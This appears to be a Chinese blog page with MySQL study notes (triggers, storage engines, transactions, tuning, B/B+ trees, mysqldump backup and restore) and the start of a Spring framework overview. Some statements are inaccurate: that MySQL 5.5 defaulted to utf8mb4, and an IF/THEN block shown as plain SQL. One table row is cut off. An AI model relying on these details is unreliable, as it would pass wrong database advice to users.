<h2 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h2><p>要删除一个已经存在的MySQL触发器，可以使用以下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TRIGGER [IF EXISTS] trigger_name;</span><br></pre></td></tr></table></figure>

<p>需要将“trigger_name”替换为你要删除的触发器的名称。可选的参数IF EXISTS表示如果该触发器不存在，也不会抛出错误并且继续执行下一个命令。</p>
<h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><p>在MySQL中，存储引擎是一种用来处理数据的组件，它决定了如何存储、读取和更新数据。MySQL支持多种不同的存储引擎。</p>
<p>常见的MySQL存储引擎包括：</p>
<ol>
<li><p>InnoDB引擎：InnoDB是MySQL默认的存储引擎，支持事务和行级锁，它可以提供更好的并发性能和可靠性，适合于处理大量更新操作的数据表。 </p>
</li>
<li><p>MyISAM引擎：MyISAM是MySQL早期的一种存储引擎，不支持事务，不支持外键，但支持全文索引和压缩等功能，适合于查询频繁、更新不频繁的数据表。</p>
</li>
<li><p>Memory引擎：Memory存储引擎将表数据存储在内存中，支持非常快速的读写操作，但数据会在MySQL重新启动或重启后丢失，适合于缓存和临时表等应用。</p>
</li>
<li><p>Archive引擎：Archive存储引擎只支持查询和插入操作，不支持更新和删除操作，可以对历史数据进行归档和压缩，节省磁盘空间。</p>
</li>
</ol>
<p>除了上述存储引擎之外，还有其他一些存储引擎，如CSV、Blackhole、Federated等，在实际应用中根据业务需求选择不同的存储引擎进行优化。需要注意的是，不同的存储引擎在性能和功能方面有很大差异，开发人员应该根据具体情况进行选择和调整。</p>
<h2 id="显示存储引擎"><a href="#显示存储引擎" class="headerlink" title="显示存储引擎"></a>显示存储引擎</h2><p>可以通过显示表的创建信息命令来查看使用的存储引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE TABLE employee; </span><br></pre></td></tr></table></figure>

<p>输出结果示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `employee` (</span><br><span class="line">  `id` int NOT NULL,</span><br><span class="line">  `emp_id` char(10) DEFAULT NULL,</span><br><span class="line">  `emp_name` varchar(10) DEFAULT NULL,</span><br><span class="line">  `manager_id` char(10) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br></pre></td></tr></table></figure>

<h2 id="修改存储引擎"><a href="#修改存储引擎" class="headerlink" title="修改存储引擎"></a>修改存储引擎</h2><p>如果需要修改已有表的存储引擎，可以使用<code>ALTER TABLE</code>语句来实现，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ENGINE=MyISAM;</span><br></pre></td></tr></table></figure>

<p>使用上述语句将会将名为<code>table_name</code>的表的存储引擎修改为<code>MyISAM</code>。</p>
<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><blockquote>
<p>将多个操作作为单个逻辑工作单元处理的功能称为事务（transaction）</p>
<p>将事务开始的处理结果反映到数据库的操作称为提交（commit）</p>
<p>不反映到数据库中而是保持恢复为原来状态的操作称为回滚（rollback）</p>
</blockquote>
<h2 id="开启事务"><a href="#开启事务" class="headerlink" title="开启事务"></a>开启事务</h2><p>如果多个操作需要一起进行，可以将其放在一个事务中，以保证所有操作都要么全部成功，要么全部失败。</p>
<p>在MySQL中，使用以下语句来开始一个事务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">START TRANSACTION;</span><br><span class="line">-- 或者 BEGIN;</span><br><span class="line">-- 或者 BEGIN WORK;</span><br></pre></td></tr></table></figure>

<p><code>BEGIN</code>和<code>BEGIN WORK</code>命令也可以用于开启一个新的事务。它们与<code>START TRANSACTION</code>命令作用相同，都可以开启一个新的事务，让后续的SQL语句在这个事务内执行。</p>
<h2 id="提交事务"><a href="#提交事务" class="headerlink" title="提交事务"></a>提交事务</h2><p>如果所有的操作都成功了，则使用以下语句来提交事务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>

<p>在MySQL中，有一个自动提交（autocommit）功能，默认情况下开启。当执行单个SQL语句时，会自动将该语句的修改内容提交到数据库，即将其作为一个事务进行处理。</p>
<p>如果需要关闭自动提交功能，则可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET autocommit = 0;</span><br></pre></td></tr></table></figure>

<p>这样，在执行多个SQL语句时，就需要手动调用BEGIN或START TRANSACTION命令开始一个新的事务，再通过COMMIT或ROLLBACK命令结束事务。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SET autocommit = 0;</span><br><span class="line"></span><br><span class="line">-- 开始一个新的事务</span><br><span class="line">BEGIN;</span><br><span class="line"></span><br><span class="line">-- 执行一些SQL语句</span><br><span class="line">INSERT INTO table1 (column1, column2) VALUES (value1, value2);</span><br><span class="line"></span><br><span class="line">-- 判断是否发生错误</span><br><span class="line">IF some_error_occured THEN</span><br><span class="line">    -- 回滚事务</span><br><span class="line">    ROLLBACK;</span><br><span class="line">ELSE</span><br><span class="line">    -- 提交事务</span><br><span class="line">    COMMIT;</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure>

<p>以上代码首先关闭了自动提交功能，然后使用BEGIN命令开始了一个新的事务，在其中执行了一些SQL语句，并根据情况选择了提交或回滚事务。</p>
<h2 id="回滚事务"><a href="#回滚事务" class="headerlink" title="回滚事务"></a>回滚事务</h2><p>需要注意的是，在MySQL中，<code>BEGIN</code>、<code>BEGIN WORK</code>和<code>START TRANSACTION</code>命令也可以配合使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BEGIN WORK;</span><br><span class="line">-- 或者 BEGIN;</span><br><span class="line">-- 或者 START TRANSACTION;</span><br><span class="line"></span><br><span class="line">-- 执行一些SQL操作</span><br><span class="line"></span><br><span class="line">SAVEPOINT sp1;</span><br><span class="line"></span><br><span class="line">-- 执行一些SQL操作</span><br><span class="line"></span><br><span class="line">ROLLBACK TO SAVEPOINT sp1;</span><br><span class="line"></span><br><span class="line">-- 执行一些SQL操作</span><br><span class="line"></span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>

<p>以上示例中，除了开启环节的不同之外，还涉及到了MySQL事务中的保存点（SAVEPOINT）概念。保存点是指在事务内定义的一个标记，用于标识事务内某个时刻的状态。当事务遇到错误并进行回滚时，可以将事务恢复到保存点所标识的状态。</p>
<h1 id="调优"><a href="#调优" class="headerlink" title="调优"></a>调优</h1><p>调优可以提高数据库的性能和吞吐量。以下是一些MySQL调优的方法：</p>
<ol>
<li>优化查询语句</li>
</ol>
<ul>
<li>使用合适的索引：对于经常用于检索的列，创建索引可大幅提升查询效率；</li>
<li>避免使用SELECT *：只选取必要的列可以减少数据传输和磁盘I&#x2F;O；</li>
<li>使用EXPLAIN命令查看查询执行计划：通过观察查询计划，可以了解到查询过程中哪些步骤需要优化。</li>
</ul>
<ol start="2">
<li>调整服务器参数</li>
</ol>
<ul>
<li>修改MySQL缓冲区大小：将innodb_buffer_pool_size设置为合理的大小，以便在缓存中保留更多的数据；</li>
<li>调整处理器缓存和线程池：根据服务器的硬件规格和应用程序类型，适当增加线程池大小和处理器缓存大小，以提高并发处理能力；</li>
<li>修改文件系统缓存大小：根据服务器的硬件和操作系统，可以修改磁盘缓存大小；</li>
</ul>
<ol start="3">
<li>优化表结构设计</li>
</ol>
<ul>
<li>使用恰当的数据类型：为每个列选择最小、最合适的数据类型可以减少磁盘空间和内存开销，提高查询速度；</li>
<li>避免使用太多的JOIN：JOIN操作需要较多的CPU和内存资源，应尽可能减少其使用；</li>
<li>分解大的表：当一个表中包含大量数据时，可以考虑将其分解为多个较小的表，以提高查询和更新效率。</li>
</ul>
<ol start="4">
<li>监控数据库性能</li>
</ol>
<ul>
<li>使用SHOW STATUS或SHOW GLOBAL STATUS命令查看MySQL性能统计信息；</li>
<li>采用监控工具进行实时监控，如Nagios、Zabbix等。</li>
</ul>
<p>总而言之，在调优MySQL时需要综合考虑硬件、操作系统、数据库参数等各方面因素，对于常见的优化点进行一一梳理和测试，以找到最佳配置参数。</p>
<h1 id="B树、B-树"><a href="#B树、B-树" class="headerlink" title="B树、B+树"></a>B树、B+树</h1><p>B树和B+树都是常见的数据库索引结构，用于优化对数据库的查询操作。它们有些类似，但又有不同。</p>
<ol>
<li>B树</li>
</ol>
<p>B树（B-tree）是一种自平衡树形索引结构，通常用于磁盘或其他直接存取外存储设备的文件系统。B树允许在对数时间内进行搜索、插入和删除等操作。B树的特点：</p>
<ul>
<li>每个节点可以包含多个键值和链接；</li>
<li>所有叶子节点都位于同一层级，并且不含信息，只包含指向数据存储位置的指针；</li>
<li>非叶子节点的关键字作为索引；</li>
</ul>
<ol start="2">
<li>B+树</li>
</ol>
<p>B+树（B-plus tree）也是一种自平衡树形结构，其基本原理与B树相似，但在实现细节上有所不同，主要用于数据库和操作系统中。B+树的特点：</p>
<ul>
<li>所有叶子节点包含全部的关键字和记录指针；</li>
<li>各叶子节点通过指针连接成一个有序链表；</li>
<li>内部节点不包含具体的数据，只包含索引信息；</li>
<li>相较于B树而言，B+树更适用于范围查询。</li>
</ul>
<p>比较：</p>
<p>B+树优于B树的地方：</p>
<ul>
<li>对于查找和范围查找，B+树只需要遍历叶子节点一次即可完成操作，而B树需要在内部节点和叶子节点都进行查找，因此B+树查询效率更高；</li>
<li>非叶子节点仅存储键值信息，可以容纳更多的索引项，从而降低树的高度，提高查询速度；</li>
<li>B+树所有叶子节点形成一个双向链表，可以方便地支持区间查找和遍历。</li>
</ul>
<p>B树优于B+树的地方：</p>
<ul>
<li>B树对于随机读取和插入数据有较好的性能，同时也不易受到磁盘块大小等参数的影响。B+树相对而言只适用于顺序访问和插入数据的情况；</li>
<li>B树的非叶子节点和叶子节点的处理方式相同，实现较为简单，B+树则需要特殊的处理。</li>
</ul>
<p>总体而言，B+树的广泛应用是由于其范围查询的效率极高，并且其结构使得查询很容易地通过迭代来实现。</p>
<h1 id="备份和恢复数据库"><a href="#备份和恢复数据库" class="headerlink" title="备份和恢复数据库"></a>备份和恢复数据库</h1><p>MySQL有多种备份数据库的方式，包括物理备份和逻辑备份，在备份时，需要根据实际情况选择最合适的备份方式，并保证备份数据的一致性、完整性和安全性。</p>
<ol>
<li>物理备份</li>
</ol>
<p>物理备份是指直接备份MySQL服务器中数据文件的一种方式。这种备份方式直接将数据文件复制到指定的备份目录下，并保持与原始数据文件的完全一致，因此恢复时也很快速。</p>
<p>物理备份包括两种主要类型：</p>
<ul>
<li>冷备份：停止MySQL服务后备份数据文件，优点是备份数据的一致性好，缺点是在备份期间无法进行数据库操作。</li>
<li>热备份：不停止MySQL服务进行备份，优点是可以在备份时继续对数据库进行操作，缺点是备份数据可能会因为正在执行的事务而不完整或不一致。</li>
</ul>
<p>物理备份的命令可以使用Linux中的cp、rsync等命令，例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -a /var/lib/mysql /backup/mysql_backup</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>逻辑备份</li>
</ol>
<p>逻辑备份是指通过SQL语句来生成备份文件，备份数据以可读性较好的文本格式保存，因此备份数据相对于物理备份较大，但可以进行较为精细的筛选和处理。</p>
<p>逻辑备份包括以下主要类型：</p>
<ul>
<li>mysqldump：可以备份指定的数据库或表，甚至可以备份数据库中的指定数据，生成.sql格式的备份文件。</li>
<li>mydumper：适用于大型数据库，生成多个文件来备份数据。</li>
<li>mysqlpump：在MySQL8.0及以上版本中提供了mysqlpump命令，该命令比mysqldump更快，也支持多线程和压缩。</li>
</ul>
<p>例如，使用mysqldump备份一个名为mydatabase的数据库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysqldump -u root -p mydatabase &gt; mydatabase_backup.sql</span></span><br></pre></td></tr></table></figure>

<p>在备份时，需要注意一些重要的问题：</p>
<ol>
<li>备份文件应当保存在安全的位置，并进行良好的加密措施。</li>
<li>常规的备份操作应当建立合理的时间间隔。</li>
<li>对于生产环境的数据库，建议还使用主从复制等业务高可用方案来增加数据可靠性。</li>
</ol>
<p>恢复MySQL备份文件则相对较简单，可以使用以下命令进行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase &lt; mydatabase_backup.sql</span></span><br></pre></td></tr></table></figure>

<p>其中，mydatabase是需要恢复的数据库的名称，mydatabase_backup.sql是备份文件的路径。执行后，MySQL会将备份文件中的数据导入到MySQL服务器中，并重新生成所有的索引和约束条件，以保证数据的正确性和完整性。</p>
<p>在MySQL中，如果备份文件中的数据字符编码与目标数据库不一致，恢复数据时可能会出现乱码等问题。为了避免这种情况，可以通过指定字符集参数来将备份文件中的数据以正确的字符编码导入到目标数据库中。</p>
<p>以下是根据备份文件的字符集来重新设置字符集的命令示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase --default-character-set=utf8 &lt; backup.sql</span></span><br></pre></td></tr></table></figure>

<p>其中，mydatabase是需要恢复的数据库的名称，backup.sql是备份文件的路径。–default-character-set选项用于指定字符集，可以根据实际情况设置编码类型和字符集。如果备份文件的字符编码为GBK，则可以将上述命令修改如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase --default-character-set=gbk &lt; backup.sql</span></span><br></pre></td></tr></table></figure>

<p>在MySQL 5.5及以上版本中，默认的字符集为utf8mb4，因此如果备份文件中使用的是utf8或gbk等字符集，也需要显式地指定字符集参数。</p>
<p>另外，在备份时也应当考虑到字符编码的问题，建议在备份时同时备份字符集相关的信息。例如，在进行逻辑备份时，可以添加–set-charset选项来确保备份数据使用与数据库相同的字符集。例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysqldump -u root -p mydatabase --set-charset &gt; mydatabase_backup.sql</span></span><br></pre></td></tr></table></figure>

<p>这样，在恢复数据时就无需再指定字符集，MySQL会自动使用与备份时相同的字符集导入数据。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/05/Spring%E6%BA%90%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/05/Spring%E6%BA%90%E7%A0%81/" class="post-title-link" itemprop="url">Spring源码</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-05 21:02:38" itemprop="dateCreated datePublished" datetime="2023-05-05T21:02:38+08:00">2023-05-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-07 21:49:07" itemprop="dateModified" datetime="2023-05-07T21:49:07+08:00">2023-05-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Spring特性"><a href="#Spring特性" class="headerlink" title="Spring特性"></a>Spring特性</h1><p>Spring基于J2EE技术实现了一套轻量的Java Web Service系统应用框架，有很多优秀的特性，包括，依赖注入（DI）、控制反转（IoC）、面向切面（AOP）、轻量、灵活</p>
<ol>
<li>控制反转<ol>
<li>指的是对象依赖的对象，将会在容器的初始化完成后会主动传递给对象，而不需要对象自己创建或查询其依赖的对象，实现了系统对象之间依赖的解耦</li>
<li>Spring通过依赖注入实现控制反转，依赖注入是一种设计模式，通过该模式，对象不再创建或管理它们所需要的其他对象或服务，而是由容器（例如Spring容器）负责创建和管理这些对象或服务，并注入到需要它们的对象中。</li>
</ol>
</li>
<li>面向切面<ol>
<li>面向切面是一种编程范式，用于将系统的横切关注点（如安全性、事务、日志记录等）与业务逻辑分离</li>
<li>面向切面通过将横切关注点划分为独立的模块，并在运行时动态地将这些模块植入到程序中，从而实现了对业务逻辑的无侵入式增强</li>
<li>Spring AOP通过使用动态代理技术来实现对目标对象的增强</li>
</ol>
</li>
<li>轻量<ol>
<li>spring-web-5.2.0.RELEASE.jar和spring-core-5.2.0.RELEASE.jar均仅有1.4M左右</li>
<li>只需要少量的操作系统资源</li>
</ol>
</li>
<li>灵活<ol>
<li>是模块化的，可以按需引入模块（以jar包依赖的方式引入）</li>
</ol>
</li>
</ol>
<h1 id="Spring的核心JAR包"><a href="#Spring的核心JAR包" class="headerlink" title="Spring的核心JAR包"></a>Spring的核心JAR包</h1><p>Spring是模块化实现的，每个模块对应不同的JAR包</p>
<p>Spring框架的所有JAR包：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>spring-aop</td>
<td>提供了Spring框架的面向切面编程（AOP）功能，用于在运行时动态地增强应用程序的功能。</td>
</tr>
<tr>
<td>spring-aspects</td>
<td>提供了Spring框架的切面库，包括对AspectJ切面的支持和一些通用切面的实现。</td>
</tr>
<tr>
<td>spring-beans</td>
<td>提供了Spring框架的BeanFactory和FactoryBean等工厂类，用于管理和配置应用程序中的对象。</td>
</tr>
<tr>
<td>spring-context</td>
<td>提供了Spring框架的应用上下文（ApplicationContext），用于管理应用程序中的Bean对象，以及Spring框架的事件驱动编程模型。</td>
</tr>
<tr>
<td>spring-context-indexer</td>
<td>提供了一个工具，用于在编译时为Spring应用程序生成索引文件，以提高应用程序启动的速度。</td>
</tr>
<tr>
<td>spring-context-support</td>
<td>提供了一些扩展类，用于在Spring应用程序中支持特定的应用场景，例如JPA、Velocity等。</td>
</tr>
<tr>
<td>spring-core</td>
<td>Spring框架的核心模块，提供了Spring框架的基本功能，如依赖注入、控制反转、Bean工厂等。</td>
</tr>
<tr>
<td>spring-expression</td>
<td>提供了Spring框架的表达式语言（SpEL），用于在应用程序中动态地访问和操作对象。</td>
</tr>
<tr>
<td>spring-instrument</td>
<td>提供了Spring框架的Instrumentation API支持，用于在运行时通过Java Agent来提供增强功能。</td>
</tr>
<tr>
<td>spring-instrument-tomcat</td>
<td>提供了Spring框架在Tomcat服务器中使用Instrumentation API的支持。</td>
</tr>
<tr>
<td>spring-jcl</td>
<td>提供了Spring框架的通用日志抽象库，可以在不同的日志实现之间进行切换。</td>
</tr>
<tr>
<td>spring-jdbc</td>
<td>提供了Spring框架的JDBC支持，包括对JdbcTemplate和NamedParameterJdbcTemplate等的封装。</td>
</tr>
<tr>
<td>spring-jms</td>
<td>提供了Spring框架的Java Message Service（JMS）支持，用于在应用程序中发送和接收消息。</td>
</tr>
<tr>
<td>spring-messaging</td>
<td>提供了Spring框架的消息处理功能，包括对WebSocket、STOMP、AMQP等协议的支持。</td>
</tr>
<tr>
<td>spring-orm</td>
<td>提供了Spring框架的对象关系映射（ORM）支持，包括对Hibernate、MyBatis等ORM框架的集成。</td>
</tr>
<tr>
<td>spring-oxm</td>
<td>提供了Spring框架的对象XML映射（OXM）支持，用于在Java对象和XML文档之间进行转换。</td>
</tr>
<tr>
<td>spring-test</td>
<td>提供了Spring框架的测试支持，包括对JUnit、TestNG等测试框架的集成，以及对Spring应用程序的集成测试支持。</td>
</tr>
<tr>
<td>spring-tx</td>
<td>提供了Spring框</td>
</tr>
</tbody></table>
<h1 id="Spring注解"><a href="#Spring注解" class="headerlink" title="Spring注解"></a>Spring注解</h1><p>Spring的注解将Bean的定义和依赖关系从XML配置中解放出来，应用程序只要使用注解依赖注入即可</p>
<p>Bean具体的定义和依赖关系由Spring的自动装配完成</p>
<h2 id="依赖注入相关注解"><a href="#依赖注入相关注解" class="headerlink" title="依赖注入相关注解"></a>依赖注入相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Autowired</td>
<td>自动注入</td>
<td>根据类型进行自动注入，如果有多个符合条件的Bean，可以通过指定名称或限定符来进行注入。</td>
</tr>
<tr>
<td>@Qualifier</td>
<td>限定符</td>
<td>与@Autowired一起使用，指定Bean的名称或限定符，以便进行注入。</td>
</tr>
<tr>
<td>@Resource</td>
<td>资源注入</td>
<td>根据名称进行自动注入，可以与指定类型或名称的方式进行限定。</td>
</tr>
<tr>
<td>@Value</td>
<td>属性注入</td>
<td>用于注入常量或表达式计算的结果值。</td>
</tr>
<tr>
<td>@Inject</td>
<td>JSR-330注解</td>
<td>与@Autowired类似，但具有更加灵活的限定符支持。</td>
</tr>
</tbody></table>
<h2 id="Bean定义相关注解"><a href="#Bean定义相关注解" class="headerlink" title="Bean定义相关注解"></a>Bean定义相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Component</td>
<td>通用组件</td>
<td>用于将类定义为Spring组件，并且可以与其他注解一起使用，如@Controller、@Service、@Repository等。</td>
</tr>
<tr>
<td>@Configuration</td>
<td>配置类</td>
<td>用于定义Spring应用程序的配置类，并且可以通过@Bean方法定义Bean对象。</td>
</tr>
<tr>
<td>@Bean</td>
<td>Bean定义</td>
<td>用于在配置类中定义Bean对象，并将其添加到Spring容器中。</td>
</tr>
<tr>
<td>@Profile</td>
<td>环境选择</td>
<td>用于基于不同的应用程序环境选择Bean定义，可以与@Conditional一起使用。</td>
</tr>
<tr>
<td>@Scope</td>
<td>Bean作用域</td>
<td>用于定义Bean对象的作用域，包括Singleton、Prototype、Request、Session等。</td>
</tr>
</tbody></table>
<h2 id="AOP相关注解"><a href="#AOP相关注解" class="headerlink" title="AOP相关注解"></a>AOP相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Aspect</td>
<td>切面定义</td>
<td>用于将类定义为切面，可以在其中定义切点和通知。</td>
</tr>
<tr>
<td>@Pointcut</td>
<td>切点定义</td>
<td>用于定义切点，指定连接点的匹配规则。</td>
</tr>
<tr>
<td>@Before</td>
<td>前置通知</td>
<td>在方法执行之前执行通知。</td>
</tr>
<tr>
<td>@After</td>
<td>后置通知</td>
<td>在方法执行之后执行通知。</td>
</tr>
<tr>
<td>@AfterReturning</td>
<td>返回通知</td>
<td>在方法执行之后返回结果后执行通知。</td>
</tr>
<tr>
<td>@AfterThrowing</td>
<td>异常通知</td>
<td>在方法执行时抛出异常后执行通知。</td>
</tr>
<tr>
<td>@Around</td>
<td>环绕通知</td>
<td>在方法执行之前和之后都可以执行通知。</td>
</tr>
</tbody></table>
<h2 id="Web相关注解"><a href="#Web相关注解" class="headerlink" title="Web相关注解"></a>Web相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Controller</td>
<td>控制器</td>
<td>用于将类定义为Spring MVC的控制器，处理HTTP请求并返回响应结果。</td>
</tr>
<tr>
<td>@RestController</td>
<td>REST控制器</td>
<td>与@Controller类似，但默认情况下返回JSON或XML格式的响应结果。</td>
</tr>
<tr>
<td>@RequestMapping</td>
<td>请求映射</td>
<td>用于将HTTP请求映射到处理方法上，并指定请求的URL、请求方法、请求参数等。</td>
</tr>
<tr>
<td>@GetMapping</td>
<td>GET请求映射</td>
<td>用于将HTTP GET请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PostMapping</td>
<td>POST请求映射</td>
<td>用于将HTTP POST请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PutMapping</td>
<td>PUT请求映射</td>
<td>用于将HTTP PUT请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@DeleteMapping</td>
<td>DELETE请求映射</td>
<td>用于将HTTP DELETE请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PatchMapping</td>
<td>PATCH请求映射</td>
<td>用于将HTTP PATCH请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PathVariable</td>
<td>路径变量</td>
<td>用于将URI中的变量绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestParam</td>
<td>请求参数</td>
<td>用于将HTTP请求中的参数绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestBody</td>
<td>请求体</td>
<td>用于将HTTP请求体中的数据绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestHeader</td>
<td>请求头</td>
<td>用于将HTTP请求头中的数据绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@CookieValue</td>
<td>Cookie值</td>
<td>用于将HTTP Cookie中的值绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@ResponseBody</td>
<td>响应体</td>
<td>用于将处理方法的返回值作为HTTP响应体返回给客户端。</td>
</tr>
<tr>
<td>@ResponseStatus</td>
<td>响应状态码</td>
<td>用于指定处理方法的返回状态码。</td>
</tr>
<tr>
<td>@SessionAttributes</td>
<td>会话属性</td>
<td>用于在会话中存储处理方法的模型属性。</td>
</tr>
<tr>
<td>@ModelAttribute</td>
<td>模型属性</td>
<td>用于将请求参数绑定到模型属性上。</td>
</tr>
<tr>
<td>@InitBinder</td>
<td>初始化绑定器</td>
<td>用于初始化WebDataBinder，用于数据绑定和格式化等操作。</td>
</tr>
<tr>
<td>@ExceptionHandler</td>
<td>异常处理</td>
<td>用于处理控制器中抛出的异常。</td>
</tr>
<tr>
<td>@CrossOrigin</td>
<td>跨域资源共享</td>
<td>用于处理跨域请求，允许指定允许跨域请求的来源、方法和头信息等。</td>
</tr>
</tbody></table>
<h1 id="Spring-IoC原理"><a href="#Spring-IoC原理" class="headerlink" title="Spring IoC原理"></a>Spring IoC原理</h1><h2 id="IoC简介"><a href="#IoC简介" class="headerlink" title="IoC简介"></a>IoC简介</h2><p>Spring IoC通过Java反射功能实例化并建立Bean之间的依赖关系</p>
<p>Spring IoC在完成这些底层工作的基础上，还提供了Bean实例缓存管理、Bean生命周期管理、Bean实例代理、事件发布和资源装载等高级服务</p>
<h2 id="Bean的装配流程"><a href="#Bean的装配流程" class="headerlink" title="Bean的装配流程"></a>Bean的装配流程</h2><p>Spring通过读取XML或注解获取Bean的配置信息，并在Bean容器中生成Bean配置注册表，然后根据配置注册表实例化Bean，将Bean实例载入Bean缓存池，业务程序就可以从Bean缓存池中获取Bean</p>
<h2 id="Bean的作用域"><a href="#Bean的作用域" class="headerlink" title="Bean的作用域"></a>Bean的作用域</h2><p>Bean有五种作用域：</p>
<ul>
<li>Singleton：单例作用域，表示在 Spring IoC 容器中只存在一个 Bean 对象实例，所有对该 Bean 的请求都将返回该唯一实例。</li>
<li>Prototype：原型作用域，每次对该 Bean 的请求都将创建一个新的 Bean 实例。每次使用时都会创建新的对象。</li>
<li>Request：请求作用域，每个 HTTP 请求都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 请求中有效。</li>
